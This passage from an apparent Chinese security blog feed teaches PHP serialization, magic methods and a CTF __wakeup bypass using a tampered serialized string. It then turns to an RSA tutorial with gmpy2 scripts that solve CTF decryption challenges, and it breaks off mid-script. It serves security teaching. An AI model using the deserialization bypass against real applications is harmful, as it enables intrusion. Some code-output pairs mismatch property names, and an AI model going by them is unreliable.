class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Test <span class="keyword">Object</span></span><br><span class="line">(</span><br><span class="line">    [id] =&gt; <span class="number">1</span></span><br><span class="line">    [name] =&gt; admin</span><br><span class="line">    [password] =&gt; admins</span><br><span class="line">)</span><br></pre></td></tr></table></div></figure><p>先new一个实例$m，再用<code>serialize()</code>函数将这个对象进行序列化成字符串，然后输出</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$m</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>序列化后的结果：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;i:<span class="number">2</span>;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;root&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;roots&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p>分析一下输出结果：<br><img   src="https://img-blog.csdnimg.cn/20201012205041836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>黑色箭头，字母O代表Object对象；如果是A，则代表Array数组。<br>黄色箭头，数字4，代表对象名称Test占4个字符。<br>橙色箭头，数字3，代表对象里面有3个变量。<br>红色箭头，字母s代表string类型，i代表int类型。<br>紫色箭头，数字2，代表变量名占2个字符。</p>        <h2 id="PHP反序列化"   >          <a href="#PHP反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2>      <blockquote><p>反序列化是在适当的时候把这个字符串再转化成原来的变量使用。</p></blockquote><p>函数<code>unserialize</code> ，把serialize序列化后的字符串变成一个对象。可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$id</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$name</span> =<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;admins&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$m</span>=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$m</span>-&gt;id=<span class="number">2</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;name=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$m</span>-&gt;password=<span class="string">&quot;roots&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val</span> = serialize(<span class="variable">$m</span>);</span><br><span class="line"><span class="variable">$Nm</span>=unserialize(<span class="variable">$val</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;name.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Nm</span>-&gt;id;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>输出结果：<br><img src="https://img-blog.csdnimg.cn/20201012205513840.png#pic_center" alt="在这里插入图片描述"><br><span class="exturl"><a class="exturl__link"   href="https://www.w3cschool.cn/tools/index?name=unserialize" >php在线反序列化工具</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br><img   src="https://img-blog.csdnimg.cn/2020101221001958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p>        <h2 id="魔术函数"   >          <a href="#魔术函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h2>      <p>PHP面向对象变成中，有一类函数叫做魔术函数。这些函数是以<code>__</code>开头的，依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，</p><div class="table-container"><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>__wakeup()</td><td>触发unserialize()方法时会被调用</td></tr><tr><td>__sleep()</td><td>触发serialize()方法时会被调用</td></tr><tr><td>__construct()</td><td>创建一个对象时会被调用</td></tr><tr><td>__destruct()</td><td>销毁一个对象时会被调用</td></tr><tr><td>__get()</td><td>调出不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__set()</td><td>修改或写入不可访问（private，protect等修饰）属性时会被调用。</td></tr><tr><td>__toString()</td><td>类对象被当作一个字符串使用时会被调用。</td></tr><tr><td>__isset()</td><td>对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。</td></tr><tr><td>__unset（）</td><td>对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。</td></tr><tr><td>__invoke()</td><td>将实例化对象当作方法使用时会被调用。</td></tr></tbody></table></div>        <h2 id="PHP反序列化漏洞"   >          <a href="#PHP反序列化漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2>              <h3 id="wakeup-和-sleep"   >          <a href="#wakeup-和-sleep" class="heading-link"><i class="fas fa-link"></i></a><a href="#wakeup-和-sleep" class="headerlink" title="__wakeup()和__sleep()"></a>__wakeup()和__sleep()</h3>      <blockquote><p>   <strong>PHP __wakeup()函数漏洞</strong><br>   在程序执行前，serialize() 函数会首先检查是否存在一个魔术方法 __sleep。如果存在，__sleep()方法会先被调用， 然后才执行串行化（序列化）操作。<br>   这个功能可以用于清理对象，并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个__wakeup方法。<br>   如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个wakeup()是可以被绕过的__wakeup 触发于 unserilize() 调用之前, 当反序列化时的字符串所对应的对象的数目被修改,__wake 的函数就不会被调用. 并且不会重建为对象, 但是会触发其他的魔术方法比如__destruct。</p></blockquote><p>来一道题</p><p> <strong><em>[X-CTF]unserialize3</em></strong><br>题目源码：</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></div></figure><p>打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。对xctf类进行序列化</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure><p>序列化后的结果</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p>直接传参给code的结果<br><img src="https://img-blog.csdnimg.cn/20201014185510234.png#pic_center" alt="在这里插入图片描述"><br>我们要绕过<code>__wakeup</code>这个魔术函数，利用反序列化漏洞，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会绕过<code>__wakeup</code>的执行</p><p>将上面的序列化后字符串，对象属性个数由真实值1修改为2。</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://img-blog.csdnimg.cn/2020101419075342.png#pic_center" alt="在这里插入图片描述"></p>        <h2 id="序列化参数"   >          <a href="#序列化参数" class="heading-link"><i class="fas fa-link"></i></a><a href="#序列化参数" class="headerlink" title="序列化参数"></a>序列化参数</h2>      <p>序列化参数有三种，分别是public、protected和private，三者在序列化时有明显的区别。</p>        <h3 id="public"   >          <a href="#public" class="heading-link"><i class="fas fa-link"></i></a><a href="#public" class="headerlink" title="public"></a>public</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></div></figure><p>运行结果：<br><img   src="https://img-blog.csdnimg.cn/20201123231004661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;test1&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p>public序列化后的参数变成 <code>test1</code></p>        <h3 id="private"   >          <a href="#private" class="heading-link"><i class="fas fa-link"></i></a><a href="#private" class="headerlink" title="private"></a>private</h3>      <blockquote><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p></blockquote><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></div></figure><p>运行结果：<br><img   src="https://img-blog.csdnimg.cn/20201123231030686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>而在网页中运行的结果:</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">11</span>:<span class="string">&quot;\00test\00test2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p>private序列化后的参数被反序列化后变成 <code>\00test\00test2</code> </p>        <h3 id="protected"   >          <a href="#protected" class="heading-link"><i class="fas fa-link"></i></a><a href="#protected" class="headerlink" title="protected"></a>protected</h3>      <blockquote><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></div></figure><p>运行结果：<br><img   src="https://img-blog.csdnimg.cn/20201123230813337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>而在网页中运行的结果:</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;\00*\00test3&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></div></figure><p>protected序列化后的参数变成 <code>\00*\00test3</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：PHP反序列化&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞" scheme="https://swhat.github.io/categories/%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="PHP" scheme="https://swhat.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法详解与练习</title>
    <link href="https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/"/>
    <id>https://swhat.github.io/2020/10/04/RSA%E7%AE%97%E6%B3%95%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-04T07:50:38.000Z</published>
    <updated>2021-02-03T07:57:45.426Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：做题遇到的一些RSA脚本</p><a id="more"></a>        <h2 id="1-什么是RSA"   >          <a href="#1-什么是RSA" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-什么是RSA" class="headerlink" title="1. 什么是RSA"></a>1. 什么是RSA</h2>      <p>1977年，麻省理工学院的 Ron Rivest、Adi Shamir 和 Leonard Adleman 共同提出了一种非对称加密算法，用他们三人的姓氏缩写命名为 RSA。RSA 既不是惟一，也不是最早的非对称加密算法。但它是使用最广泛，因而也是最重要的非对称加密算法。</p>        <h2 id="2-RSA算法描述"   >          <a href="#2-RSA算法描述" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-RSA算法描述" class="headerlink" title="2. RSA算法描述"></a>2. RSA算法描述</h2>              <h3 id="2-1-产生公私密钥对"   >          <a href="#2-1-产生公私密钥对" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-1-产生公私密钥对" class="headerlink" title="2.1 产生公私密钥对"></a>2.1 产生公私密钥对</h3>      <blockquote><p>1.随机选择两个不相等的质数p和q。<br>2.计算p和q的乘积n(n=p*q),n的长度就是密钥长度。<br>3.计算n的欧拉函数φ(n)： φ(n) = (p-1)(q-1)<br>4.随机选择一个整数e，也就是公钥当中用来加密的那个数字 条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。<br>5.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ)<br>6.将n和e封装成公钥，n和d封装成私钥，（n，e),(n，d)就是密钥对。</p></blockquote><p>补充说明:<br>1.下面代码中使用<code>phi</code>代替欧拉函数φ(n)<br>2.如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。</p>        <h3 id="2-2-RSA加密"   >          <a href="#2-2-RSA加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-2-RSA加密" class="headerlink" title="2.2 RSA加密"></a>2.2 RSA加密</h3>      <p> 首先对明文进行比特串分组，使得每个分组对应的十进制数小于n，然后依次对每个分组m做一次加密，所有分组的密文构成的序列就是原始消息的加密结果，即m满足0&lt;=m&lt;n，则加密算法为：<br> <code>c≡ m^e mod n</code>; c为密文，且0&lt;=c&lt;n。 （还可以表示为c = pow(m, e, N）<br> <img src="https://img-blog.csdnimg.cn/20201004174827178.png#pic_center" alt="在这里插入图片描述"></p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。只要知道E和N就可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥。即<code>公钥=(E,N)</code></p>        <h3 id="2-3-RSA解密"   >          <a href="#2-3-RSA解密" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-3-RSA解密" class="headerlink" title="2.3 RSA解密"></a>2.3 RSA解密</h3>      <p>对于密文0&lt;=c&lt;n，解密算法为： <code>m≡ c^d mod n</code>;（还可以表示为m = pow(c, d, N)）</p><p><img src="https://img-blog.csdnimg.cn/20201004113320969.png#pic_center" alt="在这里插入图片描述"><br>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥。即<code>私钥=(D,N)</code></p>        <h3 id="2-4-RSA相关值"   >          <a href="#2-4-RSA相关值" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-4-RSA相关值" class="headerlink" title="2.4 RSA相关值"></a>2.4 RSA相关值</h3>      <div class="table-container"><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>p 和 q</td><td>两个不相等的质数</td></tr><tr><td>n</td><td>大整数n，称之为模数</td></tr><tr><td>e 和 d</td><td>互为模反数的两个指数</td></tr><tr><td>c 和 m</td><td>分别是密文和明文</td></tr></tbody></table></div>        <h2 id="3-安装gmpy2"   >          <a href="#3-安装gmpy2" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-安装gmpy2" class="headerlink" title="3. 安装gmpy2"></a>3. 安装gmpy2</h2>      <p>检查一下是否安装了wheel文件包，在cmd中输入<code>wheel</code>，查看一下<br><img src="https://img-blog.csdnimg.cn/20201004171147495.png#pic_center" alt="在这里插入图片描述"><br>如果没有安装，则输入<code>pip install wheel</code>安装<br><img   src="https://img-blog.csdnimg.cn/20201004171222132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>安装好wheel后，还需要再安装gmpy2所需要的whl文件，查找需要的<span class="exturl"><a class="exturl__link"   href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" >whl文件包</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。注意，whl文件包需要和你所安装的python3版本一致；</p><p>输入python查看电脑Python版本所支持的whl文件版本<br><img src="https://img-blog.csdnimg.cn/2020100417135991.png#pic_center" alt="在这里插入图片描述"><br>我使用的是python3.8 32位，下载gmpy2‑2.0.8‑cp38‑cp38‑win32.whl，放到python文件目录下。<br><img   src="https://img-blog.csdnimg.cn/20201004172026759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>然后再在cmd中输入：pip install （whl文件的路径）<br><img src="https://img-blog.csdnimg.cn/20201004172409410.png#pic_center" alt="在这里插入图片描述"><br>最后输入：<code>pip install gmpy2</code>就可以安装，没有报错即安装成功<br><img src="https://img-blog.csdnimg.cn/2020100417261163.png#pic_center" alt="在这里插入图片描述"></p>        <h2 id="4-实战练习"   >          <a href="#4-实战练习" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-实战练习" class="headerlink" title="4. 实战练习"></a>4. 实战练习</h2>              <h3 id="4-1-已知p、q、e，求d"   >          <a href="#4-1-已知p、q、e，求d" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-1-已知p、q、e，求d" class="headerlink" title="4.1 已知p、q、e，求d"></a>4.1 已知p、q、e，求d</h3>      <p><strong>[BUUCTF]RSA</strong><br><img   src="https://img-blog.csdnimg.cn/20201005193350346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"></p><p>编写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">473398607161</span></span><br><span class="line">q = <span class="number">4511491</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></div></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20201005193500626.png#pic_center" alt="在这里插入图片描述"></p>        <h3 id="4-2-1-已知p、q、e、密文c，求明文m"   >          <a href="#4-2-1-已知p、q、e、密文c，求明文m" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-2-1-已知p、q、e、密文c，求明文m" class="headerlink" title="4.2.1 已知p、q、e、密文c，求明文m"></a>4.2.1 已知p、q、e、密文c，求明文m</h3>      <p><strong>[BUUCTF] rsarsa</strong></p><p>打开文档，给出了p、q、e的值<br><img   src="https://img-blog.csdnimg.cn/20200930105157902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br><em>方法一</em>：使用RSAtool工具<br>使用rsatool工具计算d的值，直接填入p,q,把e =  65537转换为16进制在再填入，再点击Calc.D,即可获得D的值。<br><img   src="https://img-blog.csdnimg.cn/20200930105901703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" style="width: image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,tepx;height: t_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Fpx;"  alt="在这里插入图片描述"><br>然后编写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">C = <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">d = <span class="number">56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span></span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="built_in">pow</span>(C,d,n)</span><br><span 